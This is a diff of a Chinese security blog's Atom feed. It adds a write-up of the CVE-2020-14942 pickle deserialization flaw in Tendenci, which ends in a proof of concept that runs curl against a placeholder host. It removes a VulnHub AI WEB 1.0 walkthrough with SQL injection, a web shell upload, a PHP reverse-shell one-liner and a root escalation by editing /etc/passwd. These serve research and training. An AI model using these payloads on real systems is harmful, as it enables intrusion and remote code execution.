@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2020-05-27T08:11:28.581Z</updated>
+  <updated>2020-06-22T01:47:37.485Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2020-14942-Python Tendenci Unserialize</title>
+    <link href="/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/"/>
+    <id>/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/</id>
+    <published>2020-06-22T01:45:58.000Z</published>
+    <updated>2020-06-22T01:47:37.485Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>来自一个开源协会管理系统，文件<code>tendenci\apps\helpdesk\views\staff.py</code></p><pre><code class="python">def ticket_list(request):    context = {}    ......    if request.GET.get(&#39;saved_query&#39;, None):            from_saved_query = True            try:                saved_query = SavedSearch.objects.get(pk=request.GET.get(&#39;saved_query&#39;))            except SavedSearch.DoesNotExist:                return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))            if not (saved_query.shared or saved_query.user == request.user):                return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))            import pickle            from base64 import b64decode            query_params = pickle.loads(b64decode(str(saved_query.query).encode()))        elif not (  &#39;queue&#39; in request.GET                or  &#39;assigned_to&#39; in request.GET                or  &#39;status&#39; in request.GET                or  &#39;q&#39; in request.GET                or  &#39;sort&#39; in request.GET                or  &#39;sortreverse&#39; in request.GET                    ):</code></pre><p>从上面代码看出，这是一个从views中获取参数<code>saved_query</code>，通过id判断请求的用户和数据所属用户身份，正确后反序列化其中的query值，那么这个数据库是如下，保存的是一个文本字段。</p><pre><code class="python">class SavedSearch(models.Model):    ......    query = models.TextField(        _(&#39;Search Query&#39;),        help_text=_(&#39;Pickled query object. Be wary changing this.&#39;),        )</code></pre><p>如何去处理这个字段的值，在上个文件中，找到保存的处理方法。从post中获取<code>query_encoded</code>，判断不为空则直接保存进数据库。</p><pre><code class="python">def save_query(request):    title = request.POST.get(&#39;title&#39;, None)    shared = request.POST.get(&#39;shared&#39;, False) in [&#39;on&#39;, &#39;True&#39;, True, &#39;TRUE&#39;]    query_encoded = request.POST.get(&#39;query_encoded&#39;, None)    if not title or not query_encoded:        return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))    query = SavedSearch(title=title, shared=shared, query=query_encoded, user=request.user)    query.save()</code></pre><p>那么如何调用的，同样去搜索关键词<code>save_query</code>找到路由，找到对应的name为<code>helpdesk_savequery</code>，找到对应的前端表单</p><pre><code>&lt;form method=&#39;post&#39; action=&#39;{% url 'helpdesk_savequery' %}&#39;&gt;    &lt;input type=&#39;hidden&#39; name=&#39;query_encoded&#39; value=&#39;{{ urlsafe_query }}&#39; /&gt;    &lt;dl&gt;        &lt;dt&gt;&lt;label for=&#39;id_title&#39;&gt;{% trans "Query Name" %}&lt;/label&gt;&lt;/dt&gt;        &lt;dd&gt;&lt;input type=&#39;text&#39; name=&#39;title&#39; id=&#39;id_title&#39; /&gt;&lt;/dd&gt;        &lt;dd class=&#39;form_help_text&#39;&gt;{% trans "This name appears in the drop-down list of saved queries. If you share your query, other users will see this name, so choose something clear and descriptive!" %}&lt;/dd&gt;        &lt;dt&gt;&lt;label for=&#39;id_shared&#39;&gt;{% trans "Shared?" %}&lt;/label&gt;&lt;/dt&gt;        &lt;dd&gt;&lt;input type=&#39;checkbox&#39; name=&#39;shared&#39; id=&#39;id_shared&#39; /&gt; {% trans "Yes, share this query with other users." %}&lt;/dd&gt;        &lt;dd class=&#39;form_help_text&#39;&gt;{% trans "If you share this query, it will be visible by <em>all</em> other logged-in users." %}&lt;/dd&gt;    &lt;/dl&gt;    &lt;div class=&#39;buttons&#39;&gt;        &lt;input class=&quot;btn btn-primary&quot; type=&#39;submit&#39; value=&#39;{% trans "Save Query" %}&#39;&gt;    &lt;/div&gt;    {% csrf_token %}&lt;/form&gt;</code></pre><p>从表单中可以看到，<code>query_encoded</code>是模板写入，找到<code>urlsafe_query</code>看是如何调用的，从调用结果看，就知道是后台先去序列化然后赋值给模板，前端模板操作的时候，再把这个序列化的值传入后台中去反序列化。</p><pre><code class="python">......    import pickle    from base64 import b64encode    urlsafe_query = b64encode(pickle.dumps(query_params)).decode()</code></pre><p>尝试构造一个反序列化的poc</p><pre><code class="python">import pickle,osfrom base64 import b64encodeclass exp(object):    def __reduce__(self):        return (os.system,(&#39;curl http://xxxx/py&#39;,))e = exp()b64encode(pickle.dumps(e))</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;反序列化&quot;&gt;&lt;a href=&quot;#反序列化&quot; class=&quot;headerlink&quot; title=&quot;反序列化&quot;&gt;&lt;/a&gt;反序列化&lt;/h4&gt;&lt;p&gt;来自一个开源协会管理系统，文件&lt;code&gt;tendenci\apps\helpdesk\views\staff.py&lt;/co
+      
+    
+    </summary>
+    
+    
+      <category term="python" scheme="/tags/python/"/>
+    
+  </entry>
   
   <entry>
     <title>Python 过滤器</title>
@@ -469,31 +492,6 @@
     
     
       <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VulnHub AI WEB 1.0</title>
-    <link href="/2019/11/AI-WEB%201.0/"/>
-    <id>/2019/11/AI-WEB 1.0/</id>
-    <published>2019-11-06T08:39:05.000Z</published>
-    <updated>2019-11-25T09:29:51.997Z</updated>
-    
-    <content type="html"><![CDATA[<p>加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。</p><p>扫描端口发现只有80的对外开放端口，访问发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682029896.png" alt="1572682029896"></p><p>扫描路径发现robots文件。其中两个路径文件，看样子是文件上传的地址。</p><p><img src="/2019/11/AI-WEB 1.0/1572682020738.png" alt="1572682020738"></p><p>访问其中地址，403</p><p><img src="/2019/11/AI-WEB 1.0/1572682335561.png" alt="1572682335561"></p><p>介于是403尝试访问上一级发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682385016.png" alt="1572682385016"></p><p>尝试输入1，发现显示admin用户，那就是说可能这是个注入点。</p><p><img src="/2019/11/AI-WEB 1.0/1572682438951.png" alt="1572682438951"></p><p>检查是否存在注入，发现存在</p><p><img src="/2019/11/AI-WEB 1.0/1572683771039.png" alt="1572683771039"></p><p>查询systemUser库发现三个用户</p><p><img src="/2019/11/AI-WEB 1.0/1572688569479.png" alt="1572688569479"></p><pre><code>t00r      | FakeUserPassw0rd                    aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sau3er      | N0tThis0neAls0</code></pre><p>扫描路径m3diNf0下的文件，发现如下地址。</p><pre><code>http://192.168.111.132/m3diNf0/info.php </code></pre><p>找到物理地址，利用sqlmap写shell</p><p><img src="/2019/11/AI-WEB 1.0/1572705709726.png" alt="1572705709726"></p><p>把给的路径加上物理地址都试一圈，发现如下地址是可写的。</p><pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></pre><p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p><pre><code>http://192.168.111.132/se3reTdir777/uploads/a.php</code></pre><p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191102234632541.png" alt="image-20191102234632541"></p><p>查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103002714448.png" alt="image-20191103002714448"></p><p>但是这个账号下并没有发现有用的东西，利用suid位也没找到有用的信息。上传LinEnum.sh。来检查有用的信息。</p><p>后来在查看文件信息的时候发现passwd文件居然属于www-data用户权限。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103012733428.png" alt="image-20191103012733428"></p><p>这么说我这个账号还是多余的用来。</p><p>利用perl来生成加密的密码，账号密码admin</p><pre><code>perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39;  //12wGaKkN1hGuwadmin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash</code></pre><p>直接在蚁剑中追加一行</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013158615.png" alt="image-20191103013158615"></p><p>sudo过来就已经是root权限</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013307387.png" alt="image-20191103013307387"></p><p>找到flag</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013329582.png" alt="image-20191103013329582"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。&lt;/p&gt;
-&lt;p&gt;扫描端口发现只有80的对外开放端口，访问发现&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2019/11/AI-WEB 1.0/1572682029896.png&quot; alt=&quot;1572682
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
